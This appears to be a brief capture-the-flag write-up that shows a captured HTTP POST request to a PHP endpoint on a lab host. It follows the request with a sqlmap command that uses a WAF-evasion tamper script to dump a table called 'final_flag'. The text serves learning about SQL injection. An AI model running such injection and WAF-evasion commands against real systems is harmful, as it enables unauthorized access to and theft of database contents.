After a long searh we found a button that trigger a request to a php endpoint.. 
We saved the request as `req.txt`
```
POST /action.php HTTP/1.1
Host: 94.237.58.137:44537
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 8
Origin: http://94.237.58.137:44537
Connection: keep-alive
Referer: http://94.237.58.137:44537/shop.html
Priority: u=0

{"id":1}
````

Then executed following command after the prompt instructed us a Web Application firewall could be active:
```
sqlmap -r req.txt --random-agent --tamper=between --dump -T final_flag
```
